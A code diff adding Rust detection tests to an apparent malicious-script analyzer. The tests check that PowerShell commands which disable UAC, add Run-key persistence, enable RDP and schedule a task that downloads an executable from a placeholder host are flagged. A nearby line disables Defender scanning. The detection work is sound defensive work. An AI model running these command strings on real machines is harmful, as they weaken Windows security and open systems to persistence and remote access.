@@ -30347,6 +30347,87 @@ powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmai
     }
 
     #[test]
+    fn powershell_sp_alias_enablelua_emits_uac_bypass_trait() {
+        let script = br#"powershell.exe sp -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -Value 0
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UacBypass { technique } if technique == "uac-enablelua-disabled"
+            )),
+            "missing sp alias EnableLUA UacBypass: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_sp_alias_run_key_itemproperty_emits_persistence_trait() {
+        let script = br#"powershell -Command "sp -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Updater -Value calc.exe"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKCU"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    && value_name == "Updater"
+                    && command == "calc.exe"
+            )),
+            "PowerShell sp alias Run-key persistence missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_sp_alias_positional_run_key_itemproperty_emits_persistence_trait() {
+        let script =
+            br#"powershell -Command "sp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Updater calc.exe"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKCU"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    && value_name == "Updater"
+                    && command == "calc.exe"
+            )),
+            "PowerShell positional sp alias Run-key persistence missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_sp_alias_rdp_registry_values_emit_remote_access_trait() {
+        let script = br#"powershell -Command "sp -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-enable" && target == "Terminal Server"
+            )),
+            "PowerShell sp alias RDP registry enablement missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_scheduled_task_delayed_url_does_not_cross_cmd_separator() {
         let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/V:ON /c set U=https://ps-task.example/p.exe&&curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
 "#;
